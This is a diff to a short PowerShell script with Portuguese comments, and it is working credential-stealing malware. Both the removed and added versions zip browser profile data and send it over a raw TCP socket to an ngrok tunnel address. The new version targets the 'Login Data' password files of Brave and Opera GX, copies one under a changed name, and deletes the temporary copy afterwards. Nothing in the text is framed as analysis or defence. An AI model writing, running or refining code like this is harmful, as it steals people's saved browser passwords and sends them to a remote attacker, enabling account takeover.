@@ -1,33 +1,31 @@
-$roaming = "$env:APPDATA\Opera Software\Opera GX Stable\Default"
-$local   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
+$roaming = $env:APPDATA
+$local   = $env:LOCALAPPDATA
 $temp    = $env:TEMP
-$zip     = "$temp\OwO.zip"
+$zip     = "$temp\envio.zip"
+
+# Arquivo temporário com nome alterado
+$tempFile = "$temp\UwUoperad"
 
 # Remove ZIP antigo
-if (Test-Path $zip) {
-    Remove-Item $zip -Force
-}
+if (Test-Path $zip) { Remove-Item $zip -Force }
 
-# Lista de pastas possíveis
-$pastas = @($roaming, $local)
+# Cria cópia temporária com novo nome
+Copy-Item "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" $tempFile -Force
 
-# Mantém só as que existem
-$pastasExistentes = $pastas | Where-Object { Test-Path $_ }
+# Cria ZIP
+Compress-Archive `
+    "$roaming\Opera Software\Opera GX Stable\Default\Login Data", `
+    $tempFile `
+    -DestinationPath $zip -Force
 
-# Só cria o ZIP se tiver algo pra compactar
-if ($pastasExistentes.Count -gt 0) {
+# Remove o arquivo temporário
+Remove-Item $tempFile -Force
 
-    Compress-Archive `
-        -Path $pastasExistentes `
-        -DestinationPath $zip `
-        -Force
-
-    # Envia via TCP
-    $c = New-Object Net.Sockets.TCPClient("0.tcp.eu.ngrok.io", 12118)
-    $s = $c.GetStream()
-    $b = [IO.File]::ReadAllBytes($zip)
-    $s.Write($b, 0, $b.Length)
-    $s.Flush()
-    $s.Close()
-    $c.Close()
-}
+# Envia via TCP
+$c = New-Object Net.Sockets.TCPClient("2.tcp.eu.ngrok.io", 16405 )
+$s = $c.GetStream()
+$b = [IO.File]::ReadAllBytes($zip)
+$s.Write($b,0,$b.Length)
+$s.Flush()
+$s.Close()
+$c.Close()
